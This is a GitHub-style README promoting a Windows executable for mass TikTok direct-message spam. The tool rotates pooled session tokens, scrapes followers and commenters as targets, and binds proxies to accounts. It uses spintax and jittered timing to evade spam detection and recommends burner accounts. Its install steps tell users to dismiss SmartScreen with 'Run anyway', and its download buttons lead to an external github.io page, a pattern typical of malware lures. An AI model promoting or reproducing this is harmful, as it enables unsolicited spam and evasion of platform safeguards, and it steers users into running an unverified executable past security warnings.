<div align="center">
<img src="assets/banner.png" width="100%" alt="TikTok DM Spammer banner" />
</div>

<div align="center">
<p>
  <img src="https://img.shields.io/badge/Platform-Windows_11%7C10-ff5065?style=for-the-badge&logo=windows" alt="" />
  <img src="https://img.shields.io/badge/Release-2026-0891B2?style=for-the-badge" alt="" />
  <img src="https://img.shields.io/badge/Build-.exe-DC2626?style=for-the-badge" alt="" />
</p>
</div>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?color=EA580C&size=28&center=true&vCenter=true&width=900&lines=%F0%9F%94%A7+Tiktok+Dm+Blaster;%F0%9F%93%A6+Community+Tested;%E2%AD%90+Active+Development+2026;%E2%9C%85+Standalone+.exe+Release;%E2%9C%A8+Ready+for+Windows;%F0%9F%92%A1+Updated+for+2026">
</p>

<p align="center">
  <img src="https://skillicons.dev/icons?i=github" />
  <img src="https://skillicons.dev/icons?i=windows" />
</p>

---

<div align="center">

![Status](https://img.shields.io/badge/status-active-brightgreen?style=plastic)
![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011-blue?style=plastic)
![License](https://img.shields.io/badge/license-MIT-lightgrey?style=plastic)
![Build](https://img.shields.io/badge/build-2026.1-success?style=plastic)
![Type](https://img.shields.io/badge/type-desktop%20app-orange?style=plastic)

</div>

---

## 📨 Overview

**TikTok DM Spammer** is a Windows desktop app that automates outbound direct-message campaigns on TikTok — bulk sends, scheduled blasts, multi-account rotation, and reply harvesting, all from one window. I built this because the browser-based scripts floating around DM-spam forums kept breaking every two weeks, and the "premium" panels wanted a monthly fee for what is basically a queue plus a token refresher.

This is the 2026 build, patched against the current TikTok web client and Android-API message endpoint. It runs as a single `.exe` — extract, launch, paste session tokens, load a target list, hit send. No Python, no Node, no `pip install`, no command line unless you want one.

| Category | Details |
|---|---|
| **What it does** | Sends bulk DMs to user lists via account rotation |
| **How it sends** | Session-token auth against the web + mobile DM endpoints |
| **Account model** | Multi-account pool with per-account cooldowns |
| **Targeting** | Username lists, follower scrapes, comment harvests |
| **Output** | CSV/JSON logs of sent / failed / replied |
| **Runtime** | Portable `.exe`, no installer, no admin required |

---

## 🧭 Table of Contents

- [📨 Overview](#-overview)
- [⚙️ Installation — three steps and you're sending](#️-installation--three-steps-and-youre-sending)
- [🔍 What is TikTok DM Spammer, exactly](#-what-is-tiktok-dm-spammer-exactly)
- [🎯 Key Features](#-key-features)
- [🆚 This Tool vs. the alternatives](#-this-tool-vs-the-alternatives)
- [🖥️ Compatibility & platform support](#️-compatibility--platform-support)
- [📋 System Requirements](#-system-requirements)
- [🧩 Module status board](#-module-status-board)
- [🎛️ The Sending Pipeline](#️-the-sending-pipeline)
- [🧠 The Account Farm](#-the-account-farm)
- [🗂️ List Building & Targeting](#️-list-building--targeting)
- [🛰️ Anti-Detection & Throttling](#️-anti-detection--throttling)
- [📊 Logging & Analytics](#-logging--analytics)
- [🧪 Troubleshooting flow](#-troubleshooting-flow)
- [🩹 Known Issues](#-known-issues)
- [💬 Community & Support](#-community--support)
- [🎓 Tips for best results](#-tips-for-best-results)
- [❓ FAQ](#-faq)
- [📜 Changelog / Release History](#-changelog--release-history)
- [📥 Grab the build](#-grab-the-build)

---

## ⚙️ Installation — three steps and you're sending

1. **Get the archive.** Head to the project page and grab the latest release ZIP. It's portable — nothing touches your registry, nothing phones home on first boot.
2. **Extract to a folder you own.** Don't run it out of `Downloads` or from inside the ZIP viewer — Windows will throw a UAC prompt or silently block the `.exe` because of the Mark-of-the-Web. Right-click the ZIP → *Extract All* → pick something like `C:\Tools\dm-blaster`. If SmartScreen complains, hit *More info* → *Run anyway*.
3. **Launch the `.exe`.** First run drops a `config/` folder next to the binary and opens the account panel. No installer, no services, no admin rights needed — unless you want the auto-updater to write to `Program Files`, in which case just don't put it there.

> **Edge case:** if the window flashes and closes instantly, you probably extracted only the `.exe` and not the `runtime/` folder next to it. Re-extract the whole archive.

---

## 🔍 What is TikTok DM Spammer, exactly

| Term | Explanation |
|---|---|
| **Session token** | The `sessionid` cookie (and `tt_chain_token` for the mobile API) that authenticates a TikTok account without a password. The app stores these in an encrypted local vault. |
| **DM blast** | A single send job: one message payload × one target list × one account pool. |
| **Rotation** | Cycling through your account pool so no single account exceeds its per-hour message budget. |
| **Cooldown** | The enforced wait between sends per account, configurable and randomized. |
| **Rate-limit ban** | TikTok's soft block — account can still browse but cannot send DMs for a window. Detected by the app and routed around. |
| **Harvest** | Pulling usernames from a video's comment section, a follower list, or a hashtag feed to use as DM targets. |
| **Spintax** | `{Hi|Hey|Yo}` syntax that expands into randomized message variants so payloads don't fingerprint identically. |

The short version: this is a bulk DM tool with a queue, a scheduler, and a fleet of accounts behind it. The long version lives in the pipeline sections below.

- Runs fully local — no cloud panel, no subscription
- Encrypts session tokens at rest with Windows DPAPI
- Keeps per-account state so cooldowns survive restarts
- Exports every send attempt so you can audit failures
- Works with 1 account or 200 — same UI, same engine

---

## 🎯 Key Features

| Feature | Description | Benefit |
|---|---|---|
| **Multi-account pool** | Import dozens of session tokens; the scheduler rotates automatically | Scale sends without one account eating all the bans |
| **Spintax payloads** | Randomized message variants per send | Reduces identical-payload fingerprinting |
| **Smart cooldowns** | Per-account timers with jitter, persisted across sessions | Stays under rate limits without manual babysitting |
| **Target list importer** | CSV, TXT, JSON, or scraped directly from TikTok | No copy-paste hell |
| **Reply harvesting** | Reads incoming DMs and flags responders | Lets you follow up only on engaged targets |
| **Scheduled blasts** | Cron-style and one-off scheduling | Fire campaigns at odd hours without staying up |
| **Failure retry queue** | Failed sends requeue with backoff | Recovers from transient 429s automatically |
| **Live send log** | Per-target status with timestamps | Debug exactly which sends died and why |
| **Proxy binding** | Bind each account to a proxy from a rotating pool | Isolates accounts by IP |
| **Message templating** | Variables like `{username}` and `{first_name}` | Personalized DMs at scale |
| **Dry-run mode** | Full pipeline without actually sending | Test lists before you commit |
| **Portable config** | Everything lives in a local folder | Backup or migrate by copying a directory |

---

## 🖥️ Compatibility & platform support

| Platform | Support | Notes |
|---|---|---|
| Windows 11 (23H2+) | ✅ Full | Primary target for the 2026 build |
| Windows 10 (21H2+) | ✅ Full | Tested against current web client |
| Windows 8.1 | ⚠️ Legacy | Runs, but token refresh is flaky |
| Windows Server 2019/2022 | ✅ Full | Works headless with scheduler |
| macOS / Linux | ❌ Unsupported | No build planned — Windows-only by design |
| TikTok web client | ✅ Current | Patched for 2026 endpoint changes |
| TikTok mobile API | ✅ Current | Requires `tt_chain_token` alongside `sessionid` |

---

## 📋 System Requirements

| Component | Minimum | Recommended |
|---|---|---|
| **OS** | Windows 10 21H2 | Windows 11 23H2 |
| **CPU** | Dual-core 2.0 GHz | Quad-core 3.0 GHz |
| **RAM** | 4 GB | 8 GB |
| **Disk** | 200 MB free | 1 GB free (for logs) |
| **Network** | 5 Mbps stable | 20 Mbps with proxy pool |
| **Runtime** | None — bundled `.exe` | None |
| **Permissions** | Standard user | Standard user (admin only for updates outside user folder) |

---

## 🧩 Module status board

| Module | Status | Description |
|---|---|---|
| Session vault | ✅ Working | Encrypted token storage via DPAPI |
| Token refresher | ✅ Working | Re-validates sessions before each blast |
| Send queue | ✅ Working | Persistent job queue with retry |
| Account rotator | ✅ Working | Round-robin + weight-based rotation |
| Spintax engine | ✅ Working | `{a|b|c}` expansion with nested support |
| Cooldown manager | ✅ Working | Jittered timers per account |
| Rate-limit detector | ✅ Working | Parses 429/403 responses and cools the account |
| Proxy binder | ✅ Working | Per-account proxy assignment |
| Proxy pool tester | ✅ Working | Latency + IP health checks |
| Follower harvester | ✅ Working | Scrapes follower lists into target CSVs |
| Comment harvester | ✅ Working | Pulls usernames from video comments |
| Hashtag harvester | ✅ Working | Harvests from hashtag feeds |
| Reply watcher | ✅ Working | Polls inbox and flags responders |
| Scheduler | ✅ Working | Cron-style + one-off blasts |
| Template variables | ✅ Working | `{username}`, `{first_name}`, custom fields |
| List deduplicator | ✅ Working | Removes duplicate targets before send |
| Suppression list | ✅ Working | Skip already-contacted users |
| Dry-run mode | ✅ Working | Full pipeline without network sends |
| CSV/JSON exporter | ✅ Working | Full send + failure logs |
| Failure retry | ✅ Working | Backoff requeue on transient errors |
| Live log view | ✅ Working | Real-time per-target status |
| Crash recovery | ✅ Working | Resumes queue after unexpected exit |
| Config backups | ✅ Working | Auto-snapshots of account state |
| Multi-profile | ✅ Working | Separate workspaces per campaign |
| Auto-updater | ✅ Working | Checks release channel on boot |
| Message preview | ✅ Working | Renders spintax sample before send |
| Target validator | ✅ Working | Flags deleted/private targets |
| Account health score | ✅ Working | Tracks ban history per account |
| Attachment support | ⚠️ Beta | One image per DM, size-capped |
| Bulk token importer | ✅ Working | Paste or CSV import of session tokens |
| CLI mode | ⚠️ Beta | Headless send from a config file |
| Webhook notify | ✅ Working | POST on blast completion |
| Localization (EN/ES/PT) | ✅ Working | UI language toggle |

---

## 🎛️ The Sending Pipeline

Every blast walks the same four stages. Once you understand them, the rest of the UI makes sense.

**1. Load** — the queue pulls targets from your active list, filters duplicates and suppression hits, and resolves template variables.
- Target validator drops private/deleted accounts before send
- Deduplicator collapses repeats across merged lists
- Suppression list blocks anyone already messaged

**2. Assign** — each target gets an account from the pool based on rotation weight and current cooldown.
- Weight-based rotation favors healthy accounts
- Accounts mid-cooldown are skipped automatically
- Proxy binding travels with the account, not the target

**3. Send** — the payload is expanded from spintax, dispatched, and the response is parsed.
- 200 → logged as sent
- 429/403 → account flagged, job requeued
- Network error → retried with exponential backoff

**4. Record** — results land in the live log and the export file.
- Per-target status with timestamps
- Account-level ban counters updated
- Webhook fires on completion if configured

---

## 🧠 The Account Farm

The account pool is the heart of the tool. Everything else is plumbing around it.

- **Bulk import:** paste `sessionid` + `tt_chain_token` pairs, or drop a CSV with a header row.
- **Health scoring:** every account carries a rolling score based on recent bans, retries, and age.
- **Quarantine:** accounts that hit repeated rate-limit bans are parked for a configurable rest period.
- **Retire:** accounts that get hard-banned are flagged and excluded from rotation but kept for audit.
- **DPAPI encryption:** tokens are encrypted at rest against your Windows user profile — copy the folder to another machine and the vault won't decrypt.

> **Edge case:** if you migrate the tool to a new Windows user, you'll need to re-import tokens. That's the DPAPI boundary, not a bug.

---

## 🗂️ List Building & Targeting

You can bring your own list or harvest one inside the app.

- **Follower harvest** — point at a public account, pull its followers into a CSV.
- **Comment harvest** — pull usernames from the comment section of a video URL.
- **Hashtag harvest** — grab recent posters under a hashtag feed.
- **Manual import** — paste usernames one per line, or drop a CSV with a `username` column.
- **Suppression list** — a persistent `do-not-contact` file that survives across campaigns.

**Target validation** runs before every send: private accounts, deleted users, and accounts that have DMed you first (optional filter) get dropped from the queue.

---

## 🛰️ Anti-Detection & Throttling

I won't pretend this is invisible — no bulk DM tool is. What it does do is keep you under the thresholds that trigger automated enforcement.

- **Jittered cooldowns** — sends aren't on a fixed interval; the delay randomizes within a range you set.
- **Spintax payloads** — message bodies differ per send, so identical-payload detection doesn't fire.
- **Proxy binding** — each account can be pinned to its own proxy from a rotating pool.
- **Rate-limit detection** — the app reads 429 responses and cools the account instead of hammering it.
- **Health scoring** — risky accounts get fewer sends; healthy ones get more.

Set your per-account hourly cap conservatively on the first campaign of a new batch. Watch the ban rate for a day, then raise it.

---

## 📊 Logging & Analytics

Every send produces a row. Every blast produces a summary.

- **Live log:** per-target status streamed in real time — sent, failed, retrying, suppressed.
- **Export:** CSV and JSON exports of the full run, including failure reasons.
- **Account report:** per-account send count, ban count, and health score.
- **Reply tracker:** flags targets who replied so you can follow up manually.
- **Webhook:** POST the blast summary to any URL on completion.

---

## 🧪 Troubleshooting flow

1. **Nothing sends, no errors in the log.** → Confirm your token vault isn't empty and that at least one account shows *healthy*. Freshly imported tokens often need a re-validation pass; hit *Refresh Tokens*.
2. **All sends fail with 403.** → Your `sessionid` is stale. Re-export from a logged-in browser session and re-import. This is the #1 cause of mass failure.
3. **Sends succeed but targets report nothing received.** → Check whether you're on the web endpoint or mobile endpoint in Settings. Some accounts only render messages sent via the same endpoint they use.
4. **App closes on launch.** → Re-extract the full archive — you almost certainly pulled only the `.exe` without `runtime/`.
5. **Blast is stuck at 0%.** → The queue is waiting on cooldowns for every account in the pool. Either add accounts or lower the cooldown floor.

---

## 🩹 Known Issues

| Issue | Solution |
|---|---|
| Token refresh fails on Windows 8.1 | Upgrade to Windows 10+; legacy TLS stack breaks the refresh handshake |
| Attachment sends fail on some accounts | Beta feature — image DMs are rate-limited harder than text |
| CLI mode ignores scheduler | Known bug, fix queued for next build; use the GUI scheduler for now |
| High ban rate on brand-new accounts | New accounts have low trust; warm them up manually before adding to a blast |
| Export file locked on Windows | Close Excel before exporting — Windows holds the file handle |

---

## 💬 Community & Support

- **Issues:** open a GitHub issue with your log export attached — it makes debugging ten times faster.
- **Discussions:** the *Campaigns* board is where people share list-building tricks and cooldown settings that survived a week.
- **Release notes:** every build gets a changelog entry; watch the repo to get notified.
- **Forum threads:** the DM-spam communities on the usual subreddits are where the fastest workarounds show up when TikTok ships a patch.

---

## 🎓 Tips for best results

- Start with **one account and a 20-target test list**. Confirm delivery on a device you control before scaling.
- Keep your **hourly cap conservative** for the first 48 hours on any fresh account batch.
- **Rotate message templates** — one winning payload reused 5,000 times is a fingerprint.
- **Warm accounts** with normal browsing and a handful of manual DMs before adding them to the pool.
- **Use proxies** if you're running more than a handful of accounts; IP clustering is a common ban trigger.
- **Export logs after every blast** — the live log is not forever.
- **Keep the app in a folder you own**, not `Program Files`, so auto-updates don't need admin rights.
- **Re-validate tokens** weekly; session cookies expire on TikTok's schedule, not yours.

---

## ❓ FAQ

<details>
<summary><strong>Do I need to install Python or Node?</strong></summary>

No. The `.exe` is fully self-contained. Extract the archive and run it.
</details>

<details>
<summary><strong>Can I run this on a Mac?</strong></summary>

No build exists for macOS or Linux. This is a Windows-only tool.
</details>

<details>
<summary><strong>How many accounts do I actually need?</strong></summary>

Depends on your target volume. A single account with conservative cooldowns handles a few hundred sends a day. For thousands, you want a pool of 20+.
</details>

<details>
<summary><strong>Does it work with the current TikTok app version?</strong></summary>

Yes — the 2026 build is patched against the current web client and mobile DM endpoint. When TikTok ships a breaking change, a patched build usually follows within days.
</details>

<details>
<summary><strong>Where are my tokens stored?</strong></summary>

In an encrypted vault inside the `config/` folder, protected by Windows DPAPI against your user profile. Copy the folder to another Windows user and it won't decrypt.
</details>

**Q:** Will using this get my account banned?

**A:** Any bulk DM tool raises your risk. Rate-limit detection and health scoring reduce the odds, but they don't eliminate them. Use burner accounts for anything you can't afford to lose.

**Q:** Can I schedule blasts to fire overnight?

**A:** Yes. The scheduler handles cron-style recurring blasts and one-off jobs. The app must be running; it doesn't register a background service.

**Q:** What happens if a blast fails halfway through?

**A:** The queue is persistent. Failed jobs requeue with backoff, and if the app crashes, it resumes from where it left off on next launch.

**Q:** Is there a limit on how many targets I can load?

**A:** No hard limit in the app, but practical limits come from account pool size and cooldown settings. A 100,000-target list with 5 accounts will take weeks.

---

## 📜 Changelog / Release History

| Version | Date | Changes |
|---|---|---|
| 2026.1 | 2026-01-14 | Patched against new TikTok DM endpoint; added mobile-API token support; health scoring rework |
| 2025.4 | 2025-11-02 | Reply watcher added; webhook notifications; CLI mode (beta) |
| 2025.3 | 2025-08-19 | Proxy pool tester; per-account proxy binding; crash recovery |
| 2025.2 | 2025-06-07 | Spintax engine rewrite; nested variant support; message preview |
| 2025.1 | 2025-03-22 | Initial public release: send queue, account rotator, cohort management |

---

## 📥 Grab the build
<p align="center">
  <a href="https://nevenaywgmhe.github.io/tiktok-dm-blaster/">
    <img src="https://img.shields.io/badge/DOWNLOAD_FREE-TikTok_DM_Spammer-059669?style=plastic&logo=windows&logoColor=white&labelColor=047857" width="460" alt="DOWNLOAD FREE TikTok DM Spammer"/>
  </a>
</p>
Everything lives in this repo's release page — the `.exe`, the changelog, and the issue tracker. Extract, run, and start with a small test list. If the app saves you a week of copy-pasting, open an issue and tell me what broke; that's how the next build gets better.

<p align="center">
  <a href="https://nevenaywgmhe.github.io/tiktok-dm-blaster/">
    <img src="https://img.shields.io/badge/GET-TikTok_DM_Spammer_2026-DB2777?style=plastic&logo=github&logoColor=white&labelColor=BE185D" width="550" alt="GET TikTok DM Spammer 2026"/>
  </a>
</p>
